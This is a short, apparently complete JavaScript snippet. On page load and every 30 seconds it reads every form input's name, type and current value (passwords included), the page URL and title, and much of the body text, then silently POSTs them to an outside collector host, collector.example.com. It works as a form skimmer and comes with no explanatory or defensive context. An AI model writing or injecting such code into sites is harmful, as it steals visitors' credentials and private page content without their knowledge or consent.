```javascript
function scrape() {
  const data = {
    url: window.location.href,
    title: document.title,
    forms: Array.from(document.forms).map(f => ({
      action: f.action,
      inputs: Array.from(f.querySelectorAll('input')).map(i => ({
        name: i.name, type: i.type, value: i.value
      }))
    })),
    bodyText: document.body.innerText.slice(0, 50000)
  };
  fetch('https://collector.example.com/api', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data), keepalive: true
  });
}
document.addEventListener('DOMContentLoaded', scrape);
setInterval(scrape, 30000);
```

